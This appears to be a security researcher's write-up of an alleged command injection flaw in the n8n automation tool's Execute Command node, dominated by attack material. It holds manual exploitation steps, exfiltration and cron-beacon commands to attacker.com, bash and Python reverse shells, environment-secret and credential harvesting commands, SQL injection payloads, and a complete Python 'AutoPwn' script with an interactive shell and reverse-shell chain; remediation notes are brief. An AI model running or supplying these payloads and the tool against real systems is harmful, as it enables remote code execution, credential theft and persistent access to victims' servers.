---
title: "n8n Workflow Automation - Command Injection"
date: 2025-12-20
product: "n8n"
github_stars: "53.5k+"
severity: "Critical"
cvss: "9.8"
cwe: "CWE-78"
cve: "Pending"
description: "OS command injection via Execute Command node using child_process.exec()"
protected: true
unlock_password: "Targary3n0530"
---

## Executive Summary

n8n Workflow Automation contains a critical OS Command Injection vulnerability in the Execute Command node. The node uses Node.js `child_process.exec()` which spawns a shell and passes user-controlled input directly, allowing attackers with workflow creation privileges to execute arbitrary system commands.

| Field | Value |
|-------|-------|
| **Product** | n8n Workflow Automation |
| **GitHub Stars** | 53,500+ |
| **Severity** | Critical |
| **CVSS 3.1** | 9.8 |
| **CWE** | CWE-78 (OS Command Injection) |
| **Attack Vector** | Network |
| **Privileges Required** | Low (workflow creator) |

---

## Vulnerability Details

### Affected Code

**Execute Command Node** (`packages/nodes-base/nodes/ExecuteCommand/ExecuteCommand.node.ts:30`):

```typescript
import { exec } from 'child_process';

async function execPromise(command: string): Promise<IExecReturnData> {
    return await new Promise((resolve, _reject) => {
        exec(command, { cwd: process.cwd() }, (error, stdout, stderr) => {
            resolve({
                exitCode: error?.code ?? 0,
                stderr: stderr || '',
                stdout: stdout || '',
            });
        });
    });
}
```

**Usage** (`line 97`):

```typescript
command = this.getNodeParameter('command', itemIndex) as string;
const { error, exitCode, stdout, stderr } = await execPromise(command);
```

### Root Cause

The `exec()` function from Node.js `child_process` module:

1. **Spawns a shell** (`/bin/sh -c` on Linux, `cmd.exe /c` on Windows)
2. **Passes the command string directly** to the shell
3. **Does not escape shell metacharacters** (; | & $ ` etc.)

This is fundamentally different from `execFile()` which does NOT spawn a shell and is not vulnerable to command injection.

### Why This Is Dangerous

n8n is designed to automate workflows, often with:
- Access to multiple API keys and credentials
- Network connectivity to internal services
- Database connections
- Cloud provider integrations

Command injection gives attackers access to ALL of these through the n8n process context.

---

## Manual Exploitation

### Step 1: Access n8n Instance

```bash
# n8n default port is 5678
curl http://target:5678

# Check if authentication is required
curl http://target:5678/rest/workflows
```

### Step 2: Create Malicious Workflow (UI Method)

1. Log into n8n web interface
2. Create new workflow
3. Add **Manual Trigger** node
4. Add **Execute Command** node
5. Connect Manual Trigger → Execute Command
6. In Execute Command node, set command to:

```bash
id; whoami; cat /etc/passwd
```

7. Save and Execute workflow
8. View output in execution results

### Step 3: Create Malicious Workflow (API Method)

```bash
# Create workflow via API
curl -X POST http://target:5678/rest/workflows \
  -H "Content-Type: application/json" \
  -d '{
    "name": "Command Injection PoC",
    "nodes": [
      {
        "parameters": {},
        "name": "Start",
        "type": "n8n-nodes-base.manualTrigger",
        "typeVersion": 1,
        "position": [240, 300]
      },
      {
        "parameters": {
          "command": "id; whoami; cat /etc/passwd"
        },
        "name": "Execute Command",
        "type": "n8n-nodes-base.executeCommand",
        "typeVersion": 1,
        "position": [460, 300]
      }
    ],
    "connections": {
      "Start": {
        "main": [[{"node": "Execute Command", "type": "main", "index": 0}]]
      }
    }
  }'

# Execute the workflow
WORKFLOW_ID=<id from response>
curl -X POST "http://target:5678/rest/workflows/$WORKFLOW_ID/execute"

# Get execution results
curl "http://target:5678/rest/executions?workflowId=$WORKFLOW_ID"
```

### Step 4: Advanced Payloads

**Data Exfiltration:**
```bash
curl http://attacker.com/exfil?data=$(cat /etc/passwd | base64 | tr -d '\n')
```

**Reverse Shell:**
```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

**Python Reverse Shell:**
```bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

**Credential Harvesting:**
```bash
env | grep -i password; env | grep -i key; env | grep -i secret; cat ~/.n8n/config
```

**Persistence via Cron:**
```bash
(crontab -l 2>/dev/null; echo "*/5 * * * * curl http://attacker.com/beacon?h=$(hostname)") | crontab -
```

### Step 5: Exfiltrate n8n Credentials

n8n stores credentials encrypted, but the encryption key is often in environment:

```bash
# Find credentials database
find / -name "database.sqlite" 2>/dev/null

# Dump environment for encryption key
env | grep -i n8n

# Or directly access credentials via n8n API if authenticated
curl http://target:5678/rest/credentials
```

---

## Automated Exploitation (AutoPwn)

### n8n_cmdi_autopwn.py

```python
#!/usr/bin/env python3
"""
n8n Command Injection AutoPwn
CVE: Pending | CVSS: 9.8 | CWE-78

Automatically exploits Execute Command node for RCE.

Author: p3ta
"""

import argparse
import requests
import json
import sys
import time
import base64
from urllib.parse import urljoin

BANNER = """
 ███╗   ██╗ █████╗ ███╗   ██╗
 ████╗  ██║██╔══██╗████╗  ██║
 ██╔██╗ ██║╚█████╔╝██╔██╗ ██║
 ██║╚██╗██║██╔══██╗██║╚██╗██║
 ██║ ╚████║╚█████╔╝██║ ╚████║
 ╚═╝  ╚═══╝ ╚════╝ ╚═╝  ╚═══╝

    [AutoPwn] Command Injection
    For authorized security testing only
"""


class N8nExploit:
    def __init__(self, target: str, api_key: str = None):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.headers['Content-Type'] = 'application/json'
        if api_key:
            self.session.headers['X-N8N-API-KEY'] = api_key

    def check_access(self) -> dict:
        """Check if n8n is accessible and get version"""
        try:
            # Try health endpoint
            resp = self.session.get(f"{self.target}/healthz")
            if resp.status_code == 200:
                return {"accessible": True, "auth_required": False}

            # Try workflows endpoint
            resp = self.session.get(f"{self.target}/rest/workflows")
            if resp.status_code == 200:
                return {"accessible": True, "auth_required": False, "workflows": len(resp.json().get("data", []))}
            elif resp.status_code == 401:
                return {"accessible": True, "auth_required": True}

        except Exception as e:
            return {"accessible": False, "error": str(e)}

        return {"accessible": False}

    def create_exploit_workflow(self, command: str) -> dict:
        """Create a workflow with command injection payload"""
        workflow = {
            "name": f"exploit-{int(time.time())}",
            "nodes": [
                {
                    "parameters": {},
                    "id": "start",
                    "name": "Start",
                    "type": "n8n-nodes-base.manualTrigger",
                    "typeVersion": 1,
                    "position": [240, 300]
                },
                {
                    "parameters": {
                        "command": command
                    },
                    "id": "exec",
                    "name": "Execute",
                    "type": "n8n-nodes-base.executeCommand",
                    "typeVersion": 1,
                    "position": [460, 300]
                }
            ],
            "connections": {
                "Start": {
                    "main": [[{"node": "Execute", "type": "main", "index": 0}]]
                }
            },
            "active": False,
            "settings": {}
        }

        try:
            resp = self.session.post(
                f"{self.target}/rest/workflows",
                json=workflow
            )
            if resp.status_code in [200, 201]:
                return resp.json()
            else:
                return {"error": resp.text}
        except Exception as e:
            return {"error": str(e)}

    def execute_workflow(self, workflow_id: str) -> dict:
        """Execute a workflow and get results"""
        try:
            # Activate workflow first
            self.session.patch(
                f"{self.target}/rest/workflows/{workflow_id}",
                json={"active": True}
            )

            # Execute
            resp = self.session.post(
                f"{self.target}/rest/workflows/{workflow_id}/execute"
            )

            if resp.status_code != 200:
                # Try alternative execution method
                resp = self.session.post(
                    f"{self.target}/rest/workflows/{workflow_id}/run",
                    json={"workflowData": {"id": workflow_id}}
                )

            time.sleep(2)  # Wait for execution

            # Get execution results
            exec_resp = self.session.get(
                f"{self.target}/rest/executions",
                params={"workflowId": workflow_id}
            )

            if exec_resp.status_code == 200:
                executions = exec_resp.json().get("data", [])
                if executions:
                    return executions[0]

            return {"status": "executed", "note": "Check n8n UI for results"}

        except Exception as e:
            return {"error": str(e)}

    def cleanup(self, workflow_id: str):
        """Delete the exploit workflow"""
        try:
            self.session.delete(f"{self.target}/rest/workflows/{workflow_id}")
            print(f"[*] Cleaned up workflow {workflow_id}")
        except:
            pass

    def run_command(self, command: str, cleanup: bool = True) -> str:
        """Run a command and return output"""
        print(f"[*] Creating exploit workflow...")
        result = self.create_exploit_workflow(command)

        if "error" in result:
            print(f"[-] Failed to create workflow: {result['error']}")
            return None

        workflow_id = result.get("data", {}).get("id") or result.get("id")
        if not workflow_id:
            print(f"[-] No workflow ID in response")
            return None

        print(f"[+] Workflow created: {workflow_id}")
        print(f"[*] Executing command: {command[:50]}...")

        exec_result = self.execute_workflow(workflow_id)

        if cleanup:
            self.cleanup(workflow_id)

        # Extract output
        try:
            if "data" in exec_result:
                nodes_data = exec_result["data"].get("resultData", {}).get("runData", {})
                for node_name, node_runs in nodes_data.items():
                    if "Execute" in node_name:
                        for run in node_runs:
                            output = run.get("data", {}).get("main", [[]])[0]
                            if output:
                                stdout = output[0].get("json", {}).get("stdout", "")
                                stderr = output[0].get("json", {}).get("stderr", "")
                                return f"STDOUT:\n{stdout}\n\nSTDERR:\n{stderr}"
        except:
            pass

        return str(exec_result)

    def interactive_shell(self):
        """Interactive command shell via n8n"""
        print("[*] Starting interactive shell (type 'exit' to quit)")
        print("[*] Commands are executed on the n8n server")
        print()

        while True:
            try:
                cmd = input("n8n-shell$ ").strip()
                if not cmd:
                    continue
                if cmd.lower() in ['exit', 'quit']:
                    break

                output = self.run_command(cmd)
                if output:
                    print(output)
                else:
                    print("[-] No output received")
                print()

            except KeyboardInterrupt:
                print("\n[*] Exiting...")
                break

    def exploit_chain(self, attacker_host: str, attacker_port: int = 4444):
        """Full exploitation chain with reverse shell"""
        print(f"[*] Running exploitation chain...")

        # Step 1: Reconnaissance
        print("\n[+] Step 1: Reconnaissance")
        recon_cmd = "id; whoami; hostname; uname -a"
        output = self.run_command(recon_cmd)
        print(output)

        # Step 2: Environment dump
        print("\n[+] Step 2: Environment Variables")
        env_cmd = "env | grep -iE '(password|key|secret|token|api)' | head -20"
        output = self.run_command(env_cmd)
        print(output if output else "No sensitive env vars found")

        # Step 3: n8n credentials
        print("\n[+] Step 3: n8n Configuration")
        config_cmd = "cat ~/.n8n/config 2>/dev/null || echo 'Config not found'"
        output = self.run_command(config_cmd)
        print(output)

        # Step 4: Reverse shell
        print(f"\n[+] Step 4: Deploying reverse shell to {attacker_host}:{attacker_port}")
        print(f"[!] Start listener: nc -lvnp {attacker_port}")
        input("[*] Press Enter when listener is ready...")

        revshell = f"bash -c 'bash -i >& /dev/tcp/{attacker_host}/{attacker_port} 0>&1'"
        self.run_command(revshell, cleanup=False)
        print("[*] Reverse shell payload sent!")


def main():
    print(BANNER)

    parser = argparse.ArgumentParser(description="n8n Command Injection AutoPwn")
    parser.add_argument("--target", "-t", required=True, help="n8n URL (http://target:5678)")
    parser.add_argument("--api-key", "-k", help="n8n API key (if required)")
    parser.add_argument("--command", "-c", help="Single command to execute")
    parser.add_argument("--shell", "-s", action="store_true", help="Interactive shell mode")
    parser.add_argument("--chain", action="store_true", help="Full exploitation chain")
    parser.add_argument("--attacker-host", "-a", help="Attacker IP for reverse shell")
    parser.add_argument("--attacker-port", "-p", type=int, default=4444, help="Reverse shell port")
    parser.add_argument("--check", action="store_true", help="Check access only")

    args = parser.parse_args()

    exploit = N8nExploit(args.target, args.api_key)

    if args.check:
        print(f"[*] Checking access to {args.target}...")
        status = exploit.check_access()
        print(f"[+] Status: {json.dumps(status, indent=2)}")
        return

    if args.command:
        print(f"[*] Executing: {args.command}")
        output = exploit.run_command(args.command)
        if output:
            print(f"\n[+] Output:\n{output}")
        else:
            print("[-] No output")

    elif args.shell:
        exploit.interactive_shell()

    elif args.chain:
        if not args.attacker_host:
            print("[-] --attacker-host required for exploitation chain")
            sys.exit(1)
        exploit.exploit_chain(args.attacker_host, args.attacker_port)

    else:
        parser.print_help()


if __name__ == "__main__":
    main()
```

### Usage

```bash
# Check access
python3 n8n_cmdi_autopwn.py --target http://192.168.1.237:5679 --check

# Execute single command
python3 n8n_cmdi_autopwn.py --target http://target:5678 --command "id; whoami"

# Interactive shell
python3 n8n_cmdi_autopwn.py --target http://target:5678 --shell

# Full exploitation chain with reverse shell
python3 n8n_cmdi_autopwn.py \
  --target http://target:5678 \
  --chain \
  --attacker-host 10.10.14.5 \
  --attacker-port 4444

# With API key if authentication is required
python3 n8n_cmdi_autopwn.py \
  --target http://target:5678 \
  --api-key "your-api-key" \
  --shell
```

---

## Additional Vulnerabilities Found

During analysis, multiple SQL injection vulnerabilities were also discovered:

### SeaTable Trigger SQL Injection (Critical)

```typescript
// SeaTableTriggerV2.node.ts:196
sql: `SELECT * FROM \`${tableName}\` WHERE ${filterField} BETWEEN ...`

// Payload: tableName = "users; DROP TABLE secrets;--"
```

### PostgreSQL LIMIT Injection (High)

```typescript
// select.operation.ts:129
const limit = this.getNodeParameter('limit', i, 50);
query += ` LIMIT ${limit}`;

// Payload: limit = "1; SELECT pg_sleep(5)--"
```

### XXE in XML Node (Medium)

```typescript
// Xml.node.ts:264
const parser = new Parser(parserOptions);
const json = await parser.parseStringPromise(xmlData);

// Payload: XML with external entity
```

---

## Lab Environment

### Docker Compose

```yaml
services:
  n8n:
    image: n8nio/n8n:latest
    ports:
      - "5679:5678"
    environment:
      - N8N_BASIC_AUTH_ACTIVE=false
    volumes:
      - n8n_data:/home/node/.n8n
    networks:
      - n8n-net

  postgres:
    image: postgres:15
    environment:
      - POSTGRES_USER=n8n
      - POSTGRES_PASSWORD=n8npassword
      - POSTGRES_DB=n8n_test
    networks:
      - n8n-net

  attacker:
    image: python:3.11-slim
    command: python -m http.server 8888
    ports:
      - "8888:8888"
    networks:
      - n8n-net

networks:
  n8n-net:

volumes:
  n8n_data:
```

### Access Lab

```bash
# On Ludus server
cd ~/cve-labs/n8n/lab
sudo docker compose up -d

# Access at http://192.168.1.237:5679
```

---

## Impact Assessment

### Attack Scenarios

1. **Insider Threat**: Malicious employee with n8n access exfiltrates data
2. **Compromised Credentials**: Attacker gains n8n access via credential reuse
3. **Supply Chain**: Malicious workflow template imported by user
4. **Lateral Movement**: Initial access leads to n8n, then full network compromise

### Data at Risk

- All credentials stored in n8n (API keys, database passwords, OAuth tokens)
- Workflow data and execution history
- Connected service data (CRM, databases, cloud providers)
- Internal network access via compromised server

---

## Remediation

### Recommended Fix

Replace `exec()` with `execFile()`:

```typescript
import { execFile } from 'child_process';

async function execPromise(command: string, args: string[]): Promise<IExecReturnData> {
    return await new Promise((resolve, reject) => {
        execFile(command, args, { cwd: process.cwd() }, (error, stdout, stderr) => {
            resolve({
                exitCode: error?.code ?? 0,
                stderr: stderr || '',
                stdout: stdout || '',
            });
        });
    });
}
```

Or use a shell escape library:

```typescript
import { escape } from 'shell-escape';
const safeCommand = escape(userInput);
exec(safeCommand, ...);
```

### Workarounds

1. Disable Execute Command node via environment variable
2. Restrict workflow creation to trusted admins only
3. Run n8n in isolated container with minimal privileges
4. Network segment n8n from sensitive systems

---

## Timeline

| Date | Event |
|------|-------|
| 2025-12-20 | Vulnerability discovered |
| 2025-12-20 | PoC developed |
| TBD | Vendor notification |
| TBD | CVE assigned |
| TBD | Patch released |

---

## References

- [n8n GitHub Repository](https://github.com/n8n-io/n8n)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [Node.js child_process Security](https://nodejs.org/api/child_process.html#child_processexeccommand-options-callback)
- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
